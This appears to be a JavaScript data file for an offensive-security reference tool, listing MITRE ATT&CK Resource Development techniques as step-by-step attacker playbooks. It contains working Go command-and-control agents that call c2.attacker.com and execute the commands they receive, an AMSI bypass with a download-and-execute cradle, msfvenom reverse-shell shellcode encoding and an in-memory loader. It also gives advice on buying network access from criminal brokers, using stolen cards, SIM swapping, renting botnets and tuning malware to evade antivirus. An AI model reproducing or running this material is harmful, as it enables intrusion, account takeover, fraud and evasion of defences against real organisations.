export const RESOURCE_DEVELOPMENT = {
  id: "resource-development",
  name: "Resource Development",
  tacticId: "TA0042",
  subtitle: "Infrastructure Setup • Botnet Acquisition • Web Services Infra • Digital Certificates • DNS Hijack • Malware Dev • Custom Implants • Capabilities Acquisition • Staging",
  color: "#c084fc",
  techniques: [
    {
      name: "Acquire Access",
      id: "T1650",
      summary: "Initial Access Brokers • dark web • VPN credentials",
      description: "Purchase existing access to target environments from Initial Access Brokers (IABs) on criminal markets",
      tags: ["IAB", "dark web", "access purchase", "T1650"],
      steps: [
        "Monitor dark web IAB marketplaces:\n# Genesis Market, Russian Market, 2easy Shop (alternatives)\n# Look for listings with target.com domain or IP ranges",
        "Search for target organization access listings:\n# Common sold access: VPN credentials, RDP sessions, webshells, corporate network access\n# Prices range from $50 to $50,000+ depending on org size and access level",
        "Evaluate access quality before purchase:\n# Check listing for: privilege level (admin vs user), network access, AV status, persistence\n# Verify freshness (date obtained) and seller reputation",
        "OPSEC for purchase:\n# Use crypto (Monero preferred) for payment\n# Use Tor or VPN for marketplace access\n# Never reveal target identity to seller",
        "After acquisition: verify access is still valid before operational use\n# Quickly assess environment and establish persistence before access is discovered"
      ]
    },
    {
      name: "Acquire Infrastructure",
      id: "T1583",
      summary: "VPS • domains • bulletproof hosting • cloud accounts",
      description: "Obtain infrastructure for attack operations including servers, domains, and cloud accounts",
      tags: ["VPS", "domains", "bulletproof hosting", "T1583"],
      steps: [
        "Register attack domains (OPSEC-safe workflow):\n# C2 domains should look legitimate — NOT named after target, no 'hack', 'rat', 'malware'\n# Use: expired domains with existing reputation, or generic IT-sounding names\n# Expired domain benefits: existing Alexa/Cisco Umbrella reputation, aged WHOIS records\n# Check domain age and reputation before C2 use:\n$ python3 domainrecon.py --domain candidate.com  # Check Wayback Machine history\n$ curl 'https://api.cisco.com/investigate/v2/domains/candidate.com' -H 'api_key:TOKEN'  # Umbrella\n# Register with WHOIS privacy to prevent attribution:\n# Namecheap WhoisGuard, Porkbun WHOIS privacy (both free)\n# Payment: crypto (Monero for best privacy) or privacy-respecting gift cards\n# OPSEC: never register C2 domain from your real IP — use Tor or VPN",
        "Purchase VPS with anonymous payment:\n# Bulletproof providers: Frantech, 1984 Hosting (Iceland)\n# Crypto-accepting VPS: Njalla, 1984\n# Legitimate cloud (harder to attribute): AWS, Azure with stolen cards\n# Use multiple layers: VPS → VPN → Operation",
        "Set up cloud accounts for staging:\n$ aws configure\n# Use temporary credentials or compromised accounts\n# Create S3 buckets, CloudFront distributions for payload hosting",
        "Configure redirectors to hide true C2 infrastructure:\n# Redirectors are disposable — burn one, true C2 server stays alive\n# Chain: victim beacon → redirector (VPS) → team server (hidden, never exposed)\n# socat one-liner redirector:\n$ socat TCP-LISTEN:443,fork TCP:true-c2-server:443\n# nginx reverse proxy (more realistic headers/behavior):\n$ cat /etc/nginx/sites-available/c2-redirect\n> server {\n>   listen 443 ssl;\n>   location / {\n>     proxy_pass https://true-c2:443;\n>     proxy_set_header Host $host;\n>   }\n> }\n# Cloudflare as redirector (domain fronting):\n# Add C2 domain to Cloudflare, configure Workers to proxy to true C2\n# True C2 IP never appears in victim network logs — only Cloudflare IPs visible\n# Firewall rule on C2 server: only accept connections from redirector IPs",
        "DNS setup for C2 domains:\n$ dig +short c2.attacker.com\n# Short TTLs (60-300s) for fast flux C2\n# Register 5+ domains for redundancy"
      ]
    },
    {
      name: "Compromise Accounts",
      id: "T1586",
      summary: "Hijack social media • email accounts • cloud accounts",
      description: "Take over existing accounts on social media, email, or cloud platforms for use in attacks",
      tags: ["account takeover", "ATO", "social media", "T1586"],
      steps: [
        "Identify target accounts for takeover:\n# Social media, email, cloud accounts of employees or similar-named accounts\n# Accounts with weak passwords or reused breach passwords",
        "Credential stuffing against target accounts:\n$ python3 credmaster.py --username-file logins.txt --password-file passwords.txt --module msol\n# CredMaster: modular spray tool supporting many providers\n# Use breach databases to test at scale",
        "SIM swapping for accounts with SMS MFA:\n# Social engineer mobile carrier to transfer victim's number\n# Bypass SMS 2FA on Gmail, social media, crypto exchanges",
        "Use compromised accounts for:\n# Sending trusted phishing emails from legitimate accounts\n# Spreading malware via trusted social media profiles\n# Accessing internal resources linked to the account",
        "Maintain access to compromised accounts:\n# Add recovery email/phone, generate backup codes\n# Create app-specific passwords for persistence"
      ]
    },
    {
      name: "Compromise Infrastructure",
      id: "T1584",
      summary: "Web server hijack • router compromise • botnet use",
      description: "Hijack third-party infrastructure for use in attacks to increase attribution complexity",
      tags: ["web server", "router", "botnet", "T1584"],
      steps: [
        "Identify vulnerable third-party infrastructure:\n$ shodan search 'Apache/2.4.49'\n# Find servers vulnerable to path traversal / RCE\n$ nuclei -t cves/ -l targets.txt -severity critical",
        "Exploit vulnerable web servers for hosting:\n$ python3 exploit.py -t https://vuln-server.com -c 'id'\n# Use as payload hosting, phishing redirect, or C2 relay",
        "Router and network device compromise:\n$ shodan search 'product:\"MikroTik RouterOS\"'\n# Default credentials, CVE-2018-14847 (MikroTik Winbox)\n$ routersploit -t 192.168.1.1",
        "Purchase botnet access for DDoS or scanning:\n# Criminal forums sell botnet time/traffic\n# Use for port scanning, password spraying, phishing delivery",
        "Use compromised infrastructure as proxy chain:\n# Victim → Compromised Server → Real C2\n# Makes attribution difficult and blocks are less effective"
      ]
    },
    {
      name: "Develop Capabilities",
      id: "T1587",
      summary: "Custom malware • exploits • tools • implants",
      description: "Build custom attack tools, exploits, and malware to evade detection and attribution",
      tags: ["malware dev", "custom exploits", "implants", "T1587"],
      steps: [
        "Custom C2 agent in Go (evades known signatures):\n# Why Go: cross-platform, static binary (no DLL deps), compiled = harder to reverse than .NET\n# Simple but functional HTTP polling agent:\n> package main\n> import (\n>   \"crypto/tls\"\n>   \"encoding/base64\"\n>   \"net/http\"\n>   \"os/exec\"\n>   \"time\"\n> )\n> func main() {\n>   client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}\n>   for {\n>     resp, _ := client.Get(\"https://c2.attacker.com/task\")\n>     var taskB64 string\n>     // decode resp body as base64 command\n>     task, _ := base64.StdEncoding.DecodeString(taskB64)\n>     out, _ := exec.Command(\"cmd\", \"/c\", string(task)).Output()\n>     client.PostForm(\"https://c2.attacker.com/result\", map[string][]string{\"d\": {base64.StdEncoding.EncodeToString(out)}})\n>     time.Sleep(30 * time.Second)\n>   }\n> }\n$ GOOS=windows GOARCH=amd64 go build -ldflags='-s -w' -o svchost.exe agent.go\n# -s -w: strip symbols and debug info = smaller + harder to reverse",
        "Shellcode generation and encoding:\n$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f raw | \\\\\\n  python3 -c 'import sys; data=sys.stdin.buffer.read(); print([hex(b) for b in data])'\n# Further encode/encrypt to bypass AV",
        "Exploit development for target vulnerabilities:\n# Fuzz target application with AFL++, libFuzzer\n# Write POC in Python, compile to shellcode\n# Test against target OS version in lab",
        "Obfuscated PowerShell loader:\n> $c = [System.Convert]::FromBase64String('PAYLOAD')\n> $a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($c.Length)\n> [System.Runtime.InteropServices.Marshal]::Copy($c, 0, $a, $c.Length)\n> $t = [System.Threading.Thread]::new([System.Threading.ThreadStart]([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($a, [System.Action])))\n> $t.Start()\n# In-memory execution, no file written to disk",
        "Test capabilities against security tools in lab:\n# Run against CrowdStrike, Defender, SentinelOne in VM\n# Iterate until detection rate is acceptable\n# Test network traffic against IDS signatures"
      ]
    },
    {
      name: "Establish Accounts",
      id: "T1585",
      summary: "Fake personas • social media • email accounts",
      description: "Create fake online personas and accounts for social engineering, phishing, and attribution obfuscation",
      tags: ["fake persona", "social media", "email", "T1585"],
      steps: [
        "Create convincing fake personas:\n# Unique name, profile picture (AI-generated), work history\n# Use thispersondoesnotexist.com for realistic AI photos\n# Backstory: LinkedIn, GitHub, Twitter activity over time",
        "Set up operational email accounts:\n# ProtonMail, Tutanota for privacy\n# Gmail/Outlook for legitimacy in phishing campaigns\n# Never use personal accounts",
        "Build LinkedIn presence for spearphishing:\n# Connect with target employees gradually\n# Post technical content to appear legitimate\n# Use for watering hole, job offer lures",
        "GitHub account for malware hosting:\n$ git init malware-repo\n$ git add payload.exe\n$ git commit -m 'Update tool'\n$ git push\n# Host payloads on GitHub for CDN-fronted delivery",
        "Maintain persona separation:\n# Never mix operational and personal accounts\n# Use separate VMs and IPs for each persona"
      ]
    },
    {
      name: "Obtain Capabilities",
      id: "T1588",
      summary: "Purchase malware • crimeware • exploit kits • 0days",
      description: "Purchase or obtain existing attack tools, exploits, and malware from criminal markets or open sources",
      tags: ["malware purchase", "exploit kit", "0day", "T1588"],
      steps: [
        "Commercial offensive security tools (legal):\n# Cobalt Strike (~$3500/year), Brute Ratel C4, Havoc\n# These require license - also available cracked on forums",
        "Open source offensive frameworks:\n$ git clone https://github.com/BishopFox/sliver\n$ sliver-server\n# Sliver, Havoc, Metasploit, Covenant",
        "Exploit acquisition:\n# Zerodium, Crowdfence (0day market)\n# ExploitHub for N-day exploits\n# Criminal markets for commodity exploits",
        "Crimeware kit components:\n# Loaders: Emotet, IcedID style loaders\n# Stealers: Redline, Raccoon, Vidar\n# Ransomware-as-a-Service (RaaS) affiliate programs",
        "Configure and adapt purchased tools:\n# Rebuild Cobalt Strike with custom malleable C2 profile\n# Repack malware with crypter/packer\n# Change default strings, hardcoded IOCs"
      ]
    },
    {
      name: "Acquire Infrastructure - Botnet",
      id: "T1583.005",
      summary: "Botnet rental • distributed infrastructure • DDoS-for-hire • proxy networks",
      description: "Acquire or build botnet infrastructure for distributed attack operations",
      tags: ["botnet", "DDoS-for-hire", "proxy network", "T1583"],
      steps: [
        "Rent botnet access from criminal markets:\n# Underground forums: XSS.is, Exploit.in, RaidForums mirrors\n# DDoS-for-hire services, booter/stresser panels\n# Typical pricing: $20-200/hour for 10-100Gbps",
        "Build own botnet with compromised systems:\n$ msfconsole\n> use exploit/multi/handler\n> set PAYLOAD python/meterpreter/reverse_tcp\n# Deploy loader on compromised systems, register as bots",
        "Use residential proxy networks:\n# Luminati, Bright Data, Oxylabs (legitimate)\n# Underground: Proxyware infections on real users' PCs\n# Residential IPs avoid IP reputation blocks",
        "Tor exit node targeting:\n# Route operations through Tor for attribution hiding\n# Register .onion C2 server for high-anonymity C2\n$ tor & \n$ proxychains4 nmap -sT target.com\n# Slower but excellent for attribution avoidance",
        "Cloud spot instance army:\n$ for i in $(seq 1 100); do aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --region us-east-1; done\n# Ephemeral cloud instances as distributed scanning/attack infrastructure"
      ]
    },
    {
      name: "Compromise Infrastructure - DNS Server",
      id: "T1584.002",
      summary: "DNS server hijack • resolver poisoning • registrar compromise",
      description: "Compromise third-party DNS infrastructure to enable MitM and traffic redirection",
      tags: ["DNS hijack", "resolver poisoning", "registrar compromise", "T1584"],
      steps: [
        "Registrar account compromise:\n# Phish registrar admin credentials or exploit registrar portal\n# Change authoritative NS records to attacker-controlled DNS\n# All DNS queries for target.com now served by attacker",
        "DNS resolver cache poisoning (Kaminsky attack):\n$ python3 dnschef.py --fakedomains target.com --fakeip ATTACKER_IP --interface 0.0.0.0\n# dnschef: DNS proxy that can poison specific records",
        "BGP hijacking of DNS server IP:\n# Nation-state: announce more specific route for DNS server IP\n# DNS queries route to attacker-controlled server\n# Seen in real attacks against major DNS providers",
        "Subdomain takeover via dangling DNS:\n$ subzy run --targets subdomains.txt\n$ python3 can-i-take-over-xyz.py --list subs.txt\n# CNAME pointing to deprovisioned cloud resource\n# Register the resource → serve content under target subdomain",
        "Internal DNS server compromise:\n# Compromise AD-integrated DNS server\n# Add or modify DNS records to redirect internal traffic\n$ python3 dnstool.py -u domain\\user -p pass -a modify -r internal-app -d ATTACKER_IP DC_IP\n# Internal users resolve internal hostnames to attacker"
      ]
    },
    {
      name: "Develop Capabilities - Malware",
      id: "T1587.001",
      summary: "Custom implant • RAT development • evasive loader • C2 agent",
      description: "Develop custom malware including remote access tools and loaders tailored to bypass target defenses",
      tags: ["malware dev", "RAT", "custom implant", "T1587"],
      steps: [
        "Custom C2 agent in Go:\n$ cat agent.go\n> package main\n> import (\n>     \"crypto/tls\"\n>     \"encoding/json\"\n>     \"net/http\"\n>     \"os/exec\"\n>     \"time\"\n> )\n> func main() {\n>     for {\n>         resp, _ := http.Get(\"https://c2.attacker.com/task\")\n>         var task struct{ Cmd string }\n>         json.NewDecoder(resp.Body).Decode(&task)\n>         out, _ := exec.Command(\"sh\", \"-c\", task.Cmd).Output()\n>         http.PostForm(\"https://c2.attacker.com/result\", url.Values{\"data\": {string(out)}})\n>         time.Sleep(30 * time.Second)\n>     }\n> }\n$ GOOS=windows GOARCH=amd64 go build -o agent.exe agent.go",
        "Evasive PowerShell loader:\n# Combine obfuscation, AMSI bypass, in-memory execution\n> $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n> $b=$a.GetField('amsiInitFailed','NonPublic,Static')\n> $b.SetValue($null,$true)\n> $c=(New-Object Net.WebClient).DownloadString('https://c2.attacker.com/shell.ps1')\n> IEX $c",
        "Position-independent shellcode:\n$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.attacker.com LPORT=443 -f raw | \\  \n  python3 xor_encoder.py 0x41 > shellcode_xored.bin\n# XOR encoded to bypass static AV signatures",
        "Test against AV in lab:\n# Virtual machines with: Defender, CrowdStrike Falcon, SentinelOne\n# VirusTotal: never upload actual operational malware\n# Antiscan.me, kleenscan.com: offline multi-AV scan\n# Iterate: change code until detection < 10%",
        "Compile with obfuscation flags:\n$ gcc -O2 -fstack-protector -s -o implant implant.c\n# Strip symbols (-s), optimize, stack protection\n$ go build -ldflags='-s -w' -o implant\n# Strip debug symbols from Go binary"
      ]
    },
    {
      name: "Acquire Infrastructure - Web Services",
      id: "T1583.006",
      summary: "Cloud storage C2 • GitHub hosting • Pastebin • social media infrastructure",
      description: "Use legitimate web services as attack infrastructure to blend with normal traffic and evade detection",
      tags: ["cloud storage", "GitHub", "Pastebin", "T1583"],
      steps: [
        "Set up GitHub as payload hosting:\n$ git init payload-hosting\n$ cd payload-hosting && echo '# Tool' > README.md\n$ git add . && git commit -m 'initial'\n$ git remote add origin https://github.com/attacker/payload-hosting\n$ git push origin main\n# Host encoded payloads as 'legitimate looking' files\n# CDN-delivered via raw.githubusercontent.com",
        "Pastebin for C2 command staging:\n$ curl -s -X POST https://pastebin.com/api/api_post.php \\\n  -d 'api_dev_key=KEY&api_option=paste&api_paste_code=ENCODED_CMD'\n# Implants poll Pastebin URL for base64-encoded commands\n# Pastebin rarely blocked in corporate environments",
        "Cloudflare Workers as C2 relay:\n$ wrangler deploy worker.js --name c2-relay\n# worker.js proxies requests to real C2\n# All traffic through Cloudflare IPs\n# Free tier: 100,000 requests/day",
        "Azure/AWS storage for payload delivery:\n$ az storage blob upload --file payload.exe --container-name cdn --name update.exe\n$ aws s3 cp payload.exe s3://cdn-assets/update.exe --acl public-read\n# Legitimate cloud storage URLs bypass URL filtering\n# blob.core.windows.net / s3.amazonaws.com widely trusted",
        "Telegram bot as C2 channel:\n$ curl 'https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHAT&text=CMD'\n# Create Telegram bot, use as bidirectional C2\n# All traffic to api.telegram.org:443 — commonly allowed\n# Persistence: messages survive bot restarts"
      ]
    },
    {
      name: "Obtain Capabilities - Digital Certificates",
      id: "T1588.004",
      summary: "Code signing certs • TLS certs • self-signed • stolen certificates",
      description: "Obtain digital certificates for code signing and TLS to add legitimacy to attack infrastructure",
      tags: ["code signing", "TLS certs", "certificate theft", "T1588"],
      steps: [
        "Obtain free TLS cert for C2 domain (OPSEC considerations):\n# Let's Encrypt: free, automatic, widely trusted — good for short ops\n# Caveats: Let's Encrypt logs to Certificate Transparency (CT) — your domain is publicly searchable\n# Monitor your own CT log entries: crt.sh/?q=attacker.com\n# For C2: defenders search CT logs for new suspicious certs immediately after domain registration\n# Solution: use wildcard certs (obscures subdomains) or register cert days after domain (reduce correlation)\n$ certbot certonly --standalone -d c2.attacker.com\n# Wildcard cert (hides specific subdomain use):\n$ certbot certonly --dns-cloudflare -d '*.attacker.com' --dns-cloudflare-credentials cf.ini\n# Auto-renew with cron:\n$ echo '0 3 * * * certbot renew --quiet' | crontab -\n# ZeroSSL alternative (different CT log visibility):\n$ acme.sh --issue -d c2.attacker.com --standalone --server https://acme.zerossl.com/v2/DV90",
        "Purchase cheap code signing certificate:\n# Comodo, Sectigo: ~$80-200/year\n# Requires: company registration in some jurisdictions\n# Extended Validation (EV): stronger trust, harder to obtain\n# Stolen EV certs: found on dark web, used in real APT ops",
        "Self-signed cert with legitimate-looking subject:\n$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 \\\n  -subj '/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com'\n# Forged subject DN to appear legitimate\n# Useful for mTLS C2 where only implant validates cert",
        "Extract code signing cert from target binaries:\n$ sigcheck.exe -e C:\\Windows\\System32\\*.exe\n# Find legitimate signed binaries to use as DLL sideload hosts\n# Signature carried by legit PE, malicious DLL in same dir",
        "Certificate transparency monitoring for targets:\n$ python3 certstream_monitor.py --domain target.com\n# Monitor CT logs for new certs issued for target domains\n# Reveals new subdomains, infrastructure deployments"
      ]
    },
    {
      name: "Stage Capabilities",
      id: "T1608",
      summary: "Upload payloads • C2 setup • drive-by staging • link setup",
      description: "Position attack tools and capabilities on infrastructure ready for use in operations",
      tags: ["payload staging", "C2 setup", "drive-by", "T1608"],
      steps: [
        "Host payloads for delivery:\n$ python3 -m http.server 80\n# Or use nginx, Apache for serving payloads\n# Stage on GitHub, GitLab, Paste sites for CDN delivery",
        "Configure Cobalt Strike team server:\n$ ./teamserver attacker.com PASSWORD c2_profile.profile\n# Upload malleable C2 profile for traffic blending\n# Configure listeners: HTTPS, DNS, SMB",
        "Set up drive-by exploit infrastructure:\n# BeEF (Browser Exploitation Framework)\n$ beef-xss\n# Inject hook.js into compromised website\n# Target specific browsers/versions detected by UA",
        "Configure phishing infrastructure:\n$ gophish &\n# Set up landing pages, email templates, tracking\n# Configure SMTP relay (SendGrid, SES, custom)",
        "Validate infrastructure before operation:\n$ curl https://c2.attacker.com/checkin\n# Test payload delivery, C2 connectivity, redirectors\n# Ensure OPSEC: no direct connections to true C2"
      ]
    }
  ]
};